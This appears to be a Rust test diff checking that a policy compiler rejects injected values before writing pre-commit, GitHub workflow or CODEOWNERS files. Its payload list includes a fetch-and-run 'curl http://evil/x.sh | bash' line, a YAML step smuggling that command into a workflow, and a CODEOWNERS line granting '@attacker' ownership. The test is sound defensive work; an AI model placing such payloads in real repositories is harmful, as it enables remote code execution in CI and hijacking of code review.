@@ -49,6 +49,47 @@ fn policy_compile_writes_three_planes_idempotently() {
 }
 
 #[test]
+fn policy_compile_rejects_artifact_injection_before_writing_any_plane() {
+    let payloads = [
+        "a' ; curl http://evil/x.sh | bash ; '",
+        "safe/**\n      - name: Injected\n        run: curl http://evil/x.sh | bash",
+        "m.rs @owners\n* @attacker",
+    ];
+
+    for field in ["protected_paths", "gateway_allowlist"] {
+        for payload in payloads {
+            let repo = TempDir::new().unwrap();
+            let escaped = payload
+                .replace('\\', "\\\\")
+                .replace('"', "\\\"")
+                .replace('\n', "\\n");
+            std::fs::write(
+                repo.path().join("aoa-policy.yaml"),
+                format!("{field}: [\"{escaped}\"]"),
+            )
+            .unwrap();
+
+            aoa_stdin()
+                .args(["policy", "compile", "--repo", repo.path().to_str().unwrap()])
+                .assert()
+                .failure()
+                .stderr(predicate::str::contains(format!("unsafe value in {field}")));
+
+            for artifact in [
+                ".pre-commit-config.yaml",
+                ".github/workflows/aoa-policy.yml",
+                ".github/CODEOWNERS",
+            ] {
+                assert!(
+                    !repo.path().join(artifact).exists(),
+                    "{field} payload {payload:?} wrote {artifact}"
+                );
+            }
+        }
+    }
+}
+
+#[test]
 fn policy_compile_emits_gitattributes_marking_for_generated_paths() {
     let repo = TempDir::new().unwrap();
     std::fs::write(
